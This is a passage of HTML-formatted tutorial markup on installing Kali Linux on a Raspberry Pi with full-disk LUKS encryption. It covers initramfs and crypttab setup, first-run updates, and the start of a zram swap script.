&lt;span id=&quot;cb2-61&quot;&gt;&lt;a href=&quot;#cb2-61&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkfs.ext4&lt;/span&gt; -v -L ROOTFS /dev/mapper/crypt_rootfs&lt;/span&gt;
&lt;span id=&quot;cb2-62&quot;&gt;&lt;a href=&quot;#cb2-62&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mkdir&lt;/span&gt; /mnt/ext-&lt;span class=&quot;dt&quot;&gt;{root,boot}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-63&quot;&gt;&lt;a href=&quot;#cb2-63&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; /dev/mmcblk1p1 /mnt/ext-boot&lt;/span&gt;
&lt;span id=&quot;cb2-64&quot;&gt;&lt;a href=&quot;#cb2-64&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; /dev/mapper/crypt_rootfs /mnt/ext-root&lt;/span&gt;
&lt;span id=&quot;cb2-65&quot;&gt;&lt;a href=&quot;#cb2-65&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rsync&lt;/span&gt; -avh /mnt/img-boot/ /mnt/ext-boot/&lt;/span&gt;
&lt;span id=&quot;cb2-66&quot;&gt;&lt;a href=&quot;#cb2-66&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rsync&lt;/span&gt; -avh /mnt/img-root/ /mnt/ext-root/&lt;/span&gt;
&lt;span id=&quot;cb2-67&quot;&gt;&lt;a href=&quot;#cb2-67&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-68&quot;&gt;&lt;a href=&quot;#cb2-68&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# You should copy your SSH public key(s) over to /mnt/ext-root &lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-69&quot;&gt;&lt;a href=&quot;#cb2-69&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# at this point, as you&amp;#39;ll eventually need these to unlock the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-70&quot;&gt;&lt;a href=&quot;#cb2-70&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Kali ROOTFS partition via dropbear. I&amp;#39;m not writing out that&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-71&quot;&gt;&lt;a href=&quot;#cb2-71&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# step explicitly though; you could be generating a new&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-72&quot;&gt;&lt;a href=&quot;#cb2-72&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# keypair here, using keys you copied over to the bootstrap&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-73&quot;&gt;&lt;a href=&quot;#cb2-73&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# microSD above, or just copying ~/.ssh/authorized_keys from&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-74&quot;&gt;&lt;a href=&quot;#cb2-74&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# an existing system. You do you.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-75&quot;&gt;&lt;a href=&quot;#cb2-75&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-76&quot;&gt;&lt;a href=&quot;#cb2-76&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make the Pi load an initramfs on boot.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-77&quot;&gt;&lt;a href=&quot;#cb2-77&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-78&quot;&gt;&lt;a href=&quot;#cb2-78&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;initramfs initramfs.zst followkernel&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /mnt/ext-boot/config.txt&lt;/span&gt;
&lt;span id=&quot;cb2-79&quot;&gt;&lt;a href=&quot;#cb2-79&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-80&quot;&gt;&lt;a href=&quot;#cb2-80&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make sure the kernel knows where ROOTFS is. Note that we use&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-81&quot;&gt;&lt;a href=&quot;#cb2-81&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# /dev/mmcblk0p2 here rather than /dev/mmcblk1p2, because&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-82&quot;&gt;&lt;a href=&quot;#cb2-82&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# we&amp;#39;re going to remove the current microSD card and use the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-83&quot;&gt;&lt;a href=&quot;#cb2-83&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# one we&amp;#39;re creating in a moment, which means that on boot&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-84&quot;&gt;&lt;a href=&quot;#cb2-84&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# this new card with be /dev/mmcblk0!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-85&quot;&gt;&lt;a href=&quot;#cb2-85&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-86&quot;&gt;&lt;a href=&quot;#cb2-86&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -i -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s#root=/dev/mmcblk0p2#root=/dev/mapper/crypt_rootfs cryptdevice=/dev/mmcblk0p2:crypt_rootfs#&amp;#39;&lt;/span&gt; /mnt/ext-boot/cmdline.txt&lt;/span&gt;
&lt;span id=&quot;cb2-87&quot;&gt;&lt;a href=&quot;#cb2-87&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-88&quot;&gt;&lt;a href=&quot;#cb2-88&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Fix paths in /etc/fstab.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-89&quot;&gt;&lt;a href=&quot;#cb2-89&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-90&quot;&gt;&lt;a href=&quot;#cb2-90&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -i -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s#/dev/mmcblk0p2#/dev/mapper/crypt_rootfs#&amp;#39;&lt;/span&gt; /mnt/ext-root/etc/fstab&lt;/span&gt;
&lt;span id=&quot;cb2-91&quot;&gt;&lt;a href=&quot;#cb2-91&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-92&quot;&gt;&lt;a href=&quot;#cb2-92&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Add ROOTFS to /etc/crypttab.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-93&quot;&gt;&lt;a href=&quot;#cb2-93&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-94&quot;&gt;&lt;a href=&quot;#cb2-94&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;crypt_rootfs   /dev/mmcblk0p2  none    luks&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /mnt/ext-root/etc/crypttab&lt;/span&gt;
&lt;span id=&quot;cb2-95&quot;&gt;&lt;a href=&quot;#cb2-95&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-96&quot;&gt;&lt;a href=&quot;#cb2-96&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Now let&amp;#39;s actually generate the initramfs we need. Note that&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-97&quot;&gt;&lt;a href=&quot;#cb2-97&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# mkinitramfs wants a (missing) kernel config, so we copy one&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-98&quot;&gt;&lt;a href=&quot;#cb2-98&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# over from linux-headers as a work-around.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-99&quot;&gt;&lt;a href=&quot;#cb2-99&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-100&quot;&gt;&lt;a href=&quot;#cb2-100&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; -t proc none /mnt/ext-root/proc&lt;/span&gt;
&lt;span id=&quot;cb2-101&quot;&gt;&lt;a href=&quot;#cb2-101&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; -t sysfs none /mnt/ext-root/sys&lt;/span&gt;
&lt;span id=&quot;cb2-102&quot;&gt;&lt;a href=&quot;#cb2-102&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; -o bind /dev /mnt/ext-root/dev&lt;/span&gt;
&lt;span id=&quot;cb2-103&quot;&gt;&lt;a href=&quot;#cb2-103&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; -o bind /dev/pts /mnt/ext-root/dev/pts&lt;/span&gt;
&lt;span id=&quot;cb2-104&quot;&gt;&lt;a href=&quot;#cb2-104&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; -o bind /mnt/ext-boot /mnt/ext-root/boot&lt;/span&gt;
&lt;span id=&quot;cb2-105&quot;&gt;&lt;a href=&quot;#cb2-105&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;LANG=&lt;/span&gt;C &lt;span class=&quot;fu&quot;&gt;chroot&lt;/span&gt; /mnt/ext-root&lt;/span&gt;
&lt;span id=&quot;cb2-106&quot;&gt;&lt;a href=&quot;#cb2-106&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cp&lt;/span&gt; /usr/src/linux-headers-&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;uname&lt;/span&gt; -r&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;/.config &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-107&quot;&gt;&lt;a href=&quot;#cb2-107&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;   &lt;span class=&quot;ex&quot;&gt;/boot/config-&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;uname&lt;/span&gt; -r&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-108&quot;&gt;&lt;a href=&quot;#cb2-108&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkinitramfs&lt;/span&gt; -o /boot/initramfs.zst &lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;uname&lt;/span&gt; -r&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-109&quot;&gt;&lt;a href=&quot;#cb2-109&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-110&quot;&gt;&lt;a href=&quot;#cb2-110&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-111&quot;&gt;&lt;a href=&quot;#cb2-111&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Cleanup our mess.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-112&quot;&gt;&lt;a href=&quot;#cb2-112&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-113&quot;&gt;&lt;a href=&quot;#cb2-113&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-root/boot&lt;/span&gt;
&lt;span id=&quot;cb2-114&quot;&gt;&lt;a href=&quot;#cb2-114&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-root/dev/pts&lt;/span&gt;
&lt;span id=&quot;cb2-115&quot;&gt;&lt;a href=&quot;#cb2-115&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-root/dev&lt;/span&gt;
&lt;span id=&quot;cb2-116&quot;&gt;&lt;a href=&quot;#cb2-116&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-root/sys&lt;/span&gt;
&lt;span id=&quot;cb2-117&quot;&gt;&lt;a href=&quot;#cb2-117&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-root/proc&lt;/span&gt;
&lt;span id=&quot;cb2-118&quot;&gt;&lt;a href=&quot;#cb2-118&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-root&lt;/span&gt;
&lt;span id=&quot;cb2-119&quot;&gt;&lt;a href=&quot;#cb2-119&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;cryptsetup&lt;/span&gt; luksClose crypt_rootfs&lt;/span&gt;
&lt;span id=&quot;cb2-120&quot;&gt;&lt;a href=&quot;#cb2-120&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/ext-boot&lt;/span&gt;
&lt;span id=&quot;cb2-121&quot;&gt;&lt;a href=&quot;#cb2-121&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/img-root&lt;/span&gt;
&lt;span id=&quot;cb2-122&quot;&gt;&lt;a href=&quot;#cb2-122&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;umount&lt;/span&gt; /mnt/img-boot&lt;/span&gt;
&lt;span id=&quot;cb2-123&quot;&gt;&lt;a href=&quot;#cb2-123&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;losetup&lt;/span&gt; -D&lt;/span&gt;
&lt;span id=&quot;cb2-124&quot;&gt;&lt;a href=&quot;#cb2-124&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; -rf /mnt/ext-* /mnt/img-*&lt;/span&gt;
&lt;span id=&quot;cb2-125&quot;&gt;&lt;a href=&quot;#cb2-125&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now comes the moment of truth: Shut down and unplug the Pi, remove the bootstrap microSD card and the reader, put the microSD card you just created (from the reader, with the encrypted ROOTFS) into the Pi, and then plug the Pi back in. If everything went right, you should be prompted to enter the decryption passphrase you set for the microSD card, after which boot will continue and you'll be able to log into the desktop environment!&lt;/p&gt;&lt;p&gt;(Note that the console unlock message can sometimes get lost in the initial dmesg output.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://gitlab.com/kalilinux/documentation/kali-docs/-/tree/master/arm/raspberry-pi-with-luks-full-disk-encryption-2&quot;&gt;Raspberry Pi - Full Disk Encryption&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;first-run&quot;&gt;First Run&lt;/h3&gt;&lt;p&gt;After the first successful boot there's some basic housekeeping that we should do.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Change the default user password.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;passwd&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# System update. DPKG may ask you some questions during this&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;#cb3-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# process.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-11&quot;&gt;&lt;a href=&quot;#cb3-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-12&quot;&gt;&lt;a href=&quot;#cb3-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; update&lt;/span&gt;
&lt;span id=&quot;cb3-13&quot;&gt;&lt;a href=&quot;#cb3-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; full-upgrade&lt;/span&gt;
&lt;span id=&quot;cb3-14&quot;&gt;&lt;a href=&quot;#cb3-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; autoremove --purge --autoremove&lt;/span&gt;
&lt;span id=&quot;cb3-15&quot;&gt;&lt;a href=&quot;#cb3-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; clean&lt;/span&gt;
&lt;span id=&quot;cb3-16&quot;&gt;&lt;a href=&quot;#cb3-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-17&quot;&gt;&lt;a href=&quot;#cb3-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Update the (missing) kernel config.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-18&quot;&gt;&lt;a href=&quot;#cb3-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-19&quot;&gt;&lt;a href=&quot;#cb3-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cp&lt;/span&gt; /usr/src/linux-headers-&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -1 /lib/modules &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;-Re4son-v8l+$&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tail&lt;/span&gt; -1&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;/.config &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-20&quot;&gt;&lt;a href=&quot;#cb3-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;   &lt;span class=&quot;ex&quot;&gt;/boot/config-&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -1 /lib/modules &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;-Re4son-v8l+$&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tail&lt;/span&gt; -1&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-21&quot;&gt;&lt;a href=&quot;#cb3-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-22&quot;&gt;&lt;a href=&quot;#cb3-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Regenerate initramfs.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-23&quot;&gt;&lt;a href=&quot;#cb3-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-24&quot;&gt;&lt;a href=&quot;#cb3-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkinitramfs&lt;/span&gt; -o /boot/initramfs.zst &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-25&quot;&gt;&lt;a href=&quot;#cb3-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -1 /lib/modules &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;-Re4son-v8l+$&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tail&lt;/span&gt; -1&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-26&quot;&gt;&lt;a href=&quot;#cb3-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-27&quot;&gt;&lt;a href=&quot;#cb3-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-28&quot;&gt;&lt;a href=&quot;#cb3-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-29&quot;&gt;&lt;a href=&quot;#cb3-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Kali Linux on the Raspberry Pi isn't configured to use swap, which makes sense because normally it's running from a slow microSD card. Still, having some swap can aid system stability. We're going to split the baby by enabling ZRAM.&lt;/p&gt;&lt;p&gt;Begin by create /usr/local/sbin/zram.sh:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/usr/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt; in&lt;/span&gt;&lt;/span&gt;
